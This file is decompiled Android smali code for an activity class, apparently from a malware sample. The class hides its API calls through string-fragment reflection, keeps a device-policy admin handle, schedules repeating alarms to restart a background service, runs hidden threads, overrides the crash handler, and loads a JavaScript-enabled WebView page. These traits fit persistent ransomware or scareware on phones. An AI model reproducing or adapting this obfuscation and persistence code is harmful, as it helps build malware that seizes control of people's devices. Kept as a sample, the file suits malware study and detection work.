.class public Lazz/oof/aucvvgjsxswe/DragonWaer;
.super Landroid/app/Activity;
.source "DragonWaer.java"


# annotations
.annotation build Landroid/annotation/SuppressLint;
    value = {
        "NewApi"
    }
.end annotation


# instance fields
.field private ACTIVATION_REQUEST:I

.field private Bisnutirkis:Lazz/oof/aucvvgjsxswe/TwisterNet;

.field private amerikosik:Landroid/app/PendingIntent;

.field private boombanier:Landroid/app/AlarmManager;

.field fdgdfhgd:Ljava/lang/String;

.field private landing:Ljava/lang/String;

.field private mDPM:Landroid/app/admin/DevicePolicyManager;

.field private sucka:Landroid/content/Intent;

.field private webView:Landroid/webkit/WebView;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 43
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 51
    const/16 v0, 0x7b

    iput v0, p0, Lazz/oof/aucvvgjsxswe/DragonWaer;->ACTIVATION_REQUEST:I

    .line 52
    const-string v0, "tTimeM"

    iput-object v0, p0, Lazz/oof/aucvvgjsxswe/DragonWaer;->fdgdfhgd:Ljava/lang/String;

    .line 43
    return-void
.end method

.method static synthetic access$0(Lazz/oof/aucvvgjsxswe/DragonWaer;Ljava/lang/String;Landroid/content/pm/PackageManager;)Z
    .locals 1

    .prologue
    .line 298
    invoke-direct {p0, p1, p2}, Lazz/oof/aucvvgjsxswe/DragonWaer;->isit(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z

    move-result v0

    return v0
.end method

.method private isit(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z
    .locals 3
    .param p1, "packagename"    # Ljava/lang/String;
    .param p2, "packageManager"    # Landroid/content/pm/PackageManager;

    .prologue
    const/4 v1, 0x1

    .line 300
    const/4 v2, 0x1

    :try_start_0
    invoke-virtual {p2, p1, v2}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    .line 303
    :goto_0
    return v1

    .line 302
    :catch_0
    move-exception v0

    .line 303
    .local v0, "e":Landroid/content/pm/PackageManager$NameNotFoundException;
    const/4 v1, 0x0

    goto :goto_0
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 32
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 58
    invoke-super/range {p0 .. p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 59
    new-instance v2, Lazz/oof/aucvvgjsxswe/TwisterNet;

    const-string v3, "time"

    const-string v6, "null"

    move-object/from16 v0, p0

    invoke-direct {v2, v0, v3, v6}, Lazz/oof/aucvvgjsxswe/TwisterNet;-><init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    move-object/from16 v0, p0

    iput-object v2, v0, Lazz/oof/aucvvgjsxswe/DragonWaer;->Bisnutirkis:Lazz/oof/aucvvgjsxswe/TwisterNet;

    .line 61
    const-wide/16 v16, 0x0

    .line 63
    .local v16, "fdfd":J
    :try_start_0
    const-string v2, "java.lang.System"

    invoke-static {v2}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v6, "curren"

    invoke-direct {v3, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v6, v0, Lazz/oof/aucvvgjsxswe/DragonWaer;->fdgdfhgd:Ljava/lang/String;

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v6, "illis"

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v6, 0x0

    new-array v6, v6, [Ljava/lang/Class;

    invoke-virtual {v2, v3, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    const/4 v3, 0x0

    const/4 v6, 0x0

    new-array v6, v6, [Ljava/lang/Object;

    invoke-virtual {v2, v3, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/Long;

    invoke-virtual {v2}, Ljava/lang/Long;->longValue()J
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_4
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-wide v16

    .line 69
    :goto_0
    :try_start_1
    const-string v2, "alarm"

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Lazz/oof/aucvvgjsxswe/DragonWaer;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/app/AlarmManager;

    move-object/from16 v0, p0

    iput-object v2, v0, Lazz/oof/aucvvgjsxswe/DragonWaer;->boombanier:Landroid/app/AlarmManager;

    .line 70
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lazz/oof/aucvvgjsxswe/AsooLeert;

    move-object/from16 v0, p0

    invoke-direct {v2, v0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object/from16 v0, p0

    iput-object v2, v0, Lazz/oof/aucvvgjsxswe/DragonWaer;->sucka:Landroid/content/Intent;

    .line 71
    const/4 v2, 0x0

    move-object/from16 v0, p0

    iget-object v3, v0, Lazz/oof/aucvvgjsxswe/DragonWaer;->sucka:Landroid/content/Intent;

    const/4 v6, 0x0

    move-object/from16 v0, p0

    invoke-static {v0, v2, v3, v6}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v2

    move-object/from16 v0, p0

    iput-object v2, v0, Lazz/oof/aucvvgjsxswe/DragonWaer;->amerikosik:Landroid/app/PendingIntent;

    .line 72
    move-wide/from16 v4, v16

    .line 73
    .local v4, "pfffff":J
    move-object/from16 v0, p0

    iget-object v2, v0, Lazz/oof/aucvvgjsxswe/DragonWaer;->boombanier:Landroid/app/AlarmManager;

    const/4 v3, 0x0

    const-wide/32 v6, 0x2bf20

    move-object/from16 v0, p0

    iget-object v8, v0, Lazz/oof/aucvvgjsxswe/DragonWaer;->amerikosik:Landroid/app/PendingIntent;

    invoke-virtual/range {v2 .. v8}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    .line 75
    const-string v9, "ste"

    .line 76
    .local v9, "dfd":Ljava/lang/String;
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "sy"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "ma"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    move-object/from16 v0, p0

    invoke-virtual {v0, v2, v3}, Lazz/oof/aucvvgjsxswe/DragonWaer;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v23

    .line 77
    .local v23, "polzovatelDannie":Landroid/content/SharedPreferences;
    new-instance v24, Lazz/oof/aucvvgjsxswe/PiratusKin;

    invoke-direct/range {v24 .. v24}, Lazz/oof/aucvvgjsxswe/PiratusKin;-><init>()V

    .line 78
    .local v24, "putt2":Lazz/oof/aucvvgjsxswe/PiratusKin;
    const-string v15, "st"

    .line 79
    .local v15, "fdsfsdfds":Ljava/lang/String;
    const-string v11, "ar"

    .line 80
    .local v11, "dfsdfsd":Ljava/lang/String;
    const-string v2, "getString"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v6, "st"

    invoke-direct {v3, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v6, "t"

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "pu"

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "o"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    move-object/from16 v0, v24

    move-object/from16 v1, v23

    invoke-virtual {v0, v1, v2, v3, v6}, Lazz/oof/aucvvgjsxswe/PiratusKin;->runus(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v26

    .line 81
    .local v26, "start":Ljava/lang/String;
    const-string v2, "getString"

    const-string v3, "photka"

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "pu"

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "o"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    move-object/from16 v0, v24

    move-object/from16 v1, v23

    invoke-virtual {v0, v1, v2, v3, v6}, Lazz/oof/aucvvgjsxswe/PiratusKin;->runus(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v27

    .line 82
    .local v27, "start2":Ljava/lang/String;
    const-string v2, "ff"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v6, "ff="

    invoke-direct {v3, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v26

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 84
    const-string v12, "ar"

    .line 85
    .local v12, "dsfdfd":Ljava/lang/String;
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "st"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "t"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, v26

    invoke-virtual {v0, v2}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_1

    .line 86
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lazz/oof/aucvvgjsxswe/EtroDetra;

    move-object/from16 v0, p0

    invoke-direct {v2, v0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Lazz/oof/aucvvgjsxswe/DragonWaer;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 87
    invoke-virtual/range {p0 .. p0}, Lazz/oof/aucvvgjsxswe/DragonWaer;->finish()V

    .line 281
    :goto_1
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "st"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "t"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, v27

    invoke-virtual {v0, v2}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_0

    .line 284
    const-string v10, "ste"

    .line 285
    .local v10, "dfd2":Ljava/lang/String;
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "sy"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "ma"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    move-object/from16 v0, p0

    invoke-virtual {v0, v2, v3}, Lazz/oof/aucvvgjsxswe/DragonWaer;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v28

    .line 286
    .local v28, "userDetails2":Landroid/content/SharedPreferences;
    new-instance v25, Lazz/oof/aucvvgjsxswe/Pirat;

    move-object/from16 v0, v25

    move-object/from16 v1, v28

    invoke-direct {v0, v1}, Lazz/oof/aucvvgjsxswe/Pirat;-><init>(Landroid/content/SharedPreferences;)V

    .line 287
    .local v25, "rtrtr2":Lazz/oof/aucvvgjsxswe/Pirat;
    invoke-virtual/range {v25 .. v25}, Lazz/oof/aucvvgjsxswe/Pirat;->gett()Landroid/content/SharedPreferences$Editor;

    move-result-object v13

    .line 290
    .local v13, "editor2":Landroid/content/SharedPreferences$Editor;
    const-string v2, "photka"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v6, "st"

    invoke-direct {v3, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v6, "t"

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v13, v2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 291
    invoke-interface {v13}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 292
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lazz/oof/aucvvgjsxswe/MainScreen;

    move-object/from16 v0, p0

    invoke-direct {v2, v0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Lazz/oof/aucvvgjsxswe/DragonWaer;->startActivity(Landroid/content/Intent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 297
    .end local v4    # "pfffff":J
    .end local v9    # "dfd":Ljava/lang/String;
    .end local v10    # "dfd2":Ljava/lang/String;
    .end local v11    # "dfsdfsd":Ljava/lang/String;
    .end local v12    # "dsfdfd":Ljava/lang/String;
    .end local v13    # "editor2":Landroid/content/SharedPreferences$Editor;
    .end local v15    # "fdsfsdfds":Ljava/lang/String;
    .end local v23    # "polzovatelDannie":Landroid/content/SharedPreferences;
    .end local v24    # "putt2":Lazz/oof/aucvvgjsxswe/PiratusKin;
    .end local v25    # "rtrtr2":Lazz/oof/aucvvgjsxswe/Pirat;
    .end local v26    # "start":Ljava/lang/String;
    .end local v27    # "start2":Ljava/lang/String;
    .end local v28    # "userDetails2":Landroid/content/SharedPreferences;
    :cond_0
    :goto_2
    return-void

    .line 91
    .restart local v4    # "pfffff":J
    .restart local v9    # "dfd":Ljava/lang/String;
    .restart local v11    # "dfsdfsd":Ljava/lang/String;
    .restart local v12    # "dsfdfd":Ljava/lang/String;
    .restart local v15    # "fdsfsdfds":Ljava/lang/String;
    .restart local v23    # "polzovatelDannie":Landroid/content/SharedPreferences;
    .restart local v24    # "putt2":Lazz/oof/aucvvgjsxswe/PiratusKin;
    .restart local v26    # "start":Ljava/lang/String;
    .restart local v27    # "start2":Ljava/lang/String;
    :cond_1
    :try_start_2
    new-instance v2, Ljava/lang/Thread;

    new-instance v3, Lazz/oof/aucvvgjsxswe/DragonWaer$1;

    move-object/from16 v0, p0

    invoke-direct {v3, v0}, Lazz/oof/aucvvgjsxswe/DragonWaer$1;-><init>(Lazz/oof/aucvvgjsxswe/DragonWaer;)V

    invoke-direct {v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 198
    invoke-virtual {v2}, Ljava/lang/Thread;->start()V

    .line 200
    new-instance v2, Ljava/lang/Thread;

    new-instance v3, Lazz/oof/aucvvgjsxswe/DragonWaer$2;

    move-object/from16 v0, p0

    invoke-direct {v3, v0}, Lazz/oof/aucvvgjsxswe/DragonWaer$2;-><init>(Lazz/oof/aucvvgjsxswe/DragonWaer;)V

    invoke-direct {v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 236
    invoke-virtual {v2}, Ljava/lang/Thread;->start()V

    .line 238
    new-instance v2, Lazz/oof/aucvvgjsxswe/DefaultExceptionHandler;

    move-object/from16 v0, p0

    invoke-direct {v2, v0}, Lazz/oof/aucvvgjsxswe/DefaultExceptionHandler;-><init>(Landroid/app/Activity;)V

    invoke-static {v2}, Ljava/lang/Thread;->setDefaultUncaughtExceptionHandler(Ljava/lang/Thread$UncaughtExceptionHandler;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_3

    .line 245
    :goto_3
    const v2, 0x7f030001

    :try_start_3
    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Lazz/oof/aucvvgjsxswe/DragonWaer;->setContentView(I)V

    .line 247
    const v2, 0x7f080004

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Lazz/oof/aucvvgjsxswe/DragonWaer;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/webkit/WebView;

    move-object/from16 v0, p0

    iput-object v2, v0, Lazz/oof/aucvvgjsxswe/DragonWaer;->webView:Landroid/webkit/WebView;

    .line 248
    move-object/from16 v0, p0

    iget-object v2, v0, Lazz/oof/aucvvgjsxswe/DragonWaer;->webView:Landroid/webkit/WebView;

    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    move-result-object v19

    .line 252
    .local v19, "gfytgy":Landroid/webkit/WebSettings;
    :try_start_4
    const-string v2, "android.webkit.WebSettings"

    invoke-static {v2}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v2

    const-string v3, "setJavaScriptEnabled"

    const/4 v6, 0x1

    new-array v6, v6, [Ljava/lang/Class;

    const/4 v7, 0x0

    sget-object v8, Ljava/lang/Boolean;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v7

    invoke-virtual {v2, v3, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v6, 0x0

    const/4 v7, 0x1

    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v7

    aput-object v7, v3, v6

    move-object/from16 v0, v19

    invoke-virtual {v2, v0, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    .line 256
    :goto_4
    :try_start_5
    move-object/from16 v0, p0

    iget-object v2, v0, Lazz/oof/aucvvgjsxswe/DragonWaer;->webView:Landroid/webkit/WebView;

    new-instance v3, Lazz/oof/aucvvgjsxswe/DragonWaer$3;

    move-object/from16 v0, p0

    invoke-direct {v3, v0}, Lazz/oof/aucvvgjsxswe/DragonWaer$3;-><init>(Lazz/oof/aucvvgjsxswe/DragonWaer;)V

    invoke-virtual {v2, v3}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 267
    const-string v14, "tp"
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_0

    .line 269
    .local v14, "et":Ljava/lang/String;
    :try_start_6
    const-string v18, "adU"

    .line 270
    .local v18, "fgffdfd":Ljava/lang/String;
    const-string v2, "android.webkit.WebView"

    invoke-static {v2}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v6, "lo"

    invoke-direct {v3, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v18

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v6, "rl"

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v6, 0x1

    new-array v6, v6, [Ljava/lang/Class;

    const/4 v7, 0x0

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v7

    invoke-virtual {v2, v3, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    move-object/from16 v0, p0

    iget-object v3, v0, Lazz/oof/aucvvgjsxswe/DragonWaer;->webView:Landroid/webkit/WebView;

    const/4 v6, 0x1

    new-array v6, v6, [Ljava/lang/Object;

    const/4 v7, 0x0

    const-string v8, "file:///android_asset/index.html"

    aput-object v8, v6, v7

    invoke-virtual {v2, v3, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    .line 274
    .end local v18    # "fgffdfd":Ljava/lang/String;
    :goto_5
    :try_start_7
    new-instance v20, Landroid/content/Intent;

    const-class v2, Lazz/oof/aucvvgjsxswe/EtroDetra;

    move-object/from16 v0, v20

    move-object/from16 v1, p0

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 276
    .local v20, "intent":Landroid/content/Intent;
    invoke-virtual/range {p0 .. p0}, Lazz/oof/aucvvgjsxswe/DragonWaer;->getBaseContext()Landroid/content/Context;

    move-result-object v2

    const/4 v3, 0x0

    invoke-virtual/range {v20 .. v20}, Landroid/content/Intent;->getFlags()I

    move-result v6

    .line 275
    move-object/from16 v0, v20

    invoke-static {v2, v3, v0, v6}, Landroid/app/PendingIntent;->getService(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v22

    .line 278
    .local v22, "pendingIntent":Landroid/app/PendingIntent;
    const-string v2, "alarm"

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Lazz/oof/aucvvgjsxswe/DragonWaer;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v21

    check-cast v21, Landroid/app/AlarmManager;

    .line 279
    .local v21, "mgr":Landroid/app/AlarmManager;
    const/4 v2, 0x0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v6

    const-wide/32 v30, 0xc350

    add-long v6, v6, v30

    move-object/from16 v0, v21

    move-object/from16 v1, v22

    invoke-virtual {v0, v2, v6, v7, v1}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_0

    goto/16 :goto_1

    .line 294
    .end local v4    # "pfffff":J
    .end local v9    # "dfd":Ljava/lang/String;
    .end local v11    # "dfsdfsd":Ljava/lang/String;
    .end local v12    # "dsfdfd":Ljava/lang/String;
    .end local v14    # "et":Ljava/lang/String;
    .end local v15    # "fdsfsdfds":Ljava/lang/String;
    .end local v19    # "gfytgy":Landroid/webkit/WebSettings;
    .end local v20    # "intent":Landroid/content/Intent;
    .end local v21    # "mgr":Landroid/app/AlarmManager;
    .end local v22    # "pendingIntent":Landroid/app/PendingIntent;
    .end local v23    # "polzovatelDannie":Landroid/content/SharedPreferences;
    .end local v24    # "putt2":Lazz/oof/aucvvgjsxswe/PiratusKin;
    .end local v26    # "start":Ljava/lang/String;
    .end local v27    # "start2":Ljava/lang/String;
    :catch_0
    move-exception v2

    goto/16 :goto_2

    .line 271
    .restart local v4    # "pfffff":J
    .restart local v9    # "dfd":Ljava/lang/String;
    .restart local v11    # "dfsdfsd":Ljava/lang/String;
    .restart local v12    # "dsfdfd":Ljava/lang/String;
    .restart local v14    # "et":Ljava/lang/String;
    .restart local v15    # "fdsfsdfds":Ljava/lang/String;
    .restart local v19    # "gfytgy":Landroid/webkit/WebSettings;
    .restart local v23    # "polzovatelDannie":Landroid/content/SharedPreferences;
    .restart local v24    # "putt2":Lazz/oof/aucvvgjsxswe/PiratusKin;
    .restart local v26    # "start":Ljava/lang/String;
    .restart local v27    # "start2":Ljava/lang/String;
    :catch_1
    move-exception v2

    goto :goto_5

    .line 253
    .end local v14    # "et":Ljava/lang/String;
    :catch_2
    move-exception v2

    goto/16 :goto_4

    .line 240
    .end local v19    # "gfytgy":Landroid/webkit/WebSettings;
    :catch_3
    move-exception v2

    goto/16 :goto_3

    .line 65
    .end local v4    # "pfffff":J
    .end local v9    # "dfd":Ljava/lang/String;
    .end local v11    # "dfsdfsd":Ljava/lang/String;
    .end local v12    # "dsfdfd":Ljava/lang/String;
    .end local v15    # "fdsfsdfds":Ljava/lang/String;
    .end local v23    # "polzovatelDannie":Landroid/content/SharedPreferences;
    .end local v24    # "putt2":Lazz/oof/aucvvgjsxswe/PiratusKin;
    .end local v26    # "start":Ljava/lang/String;
    .end local v27    # "start2":Ljava/lang/String;
    :catch_4
    move-exception v2

    goto/16 :goto_0
.end method
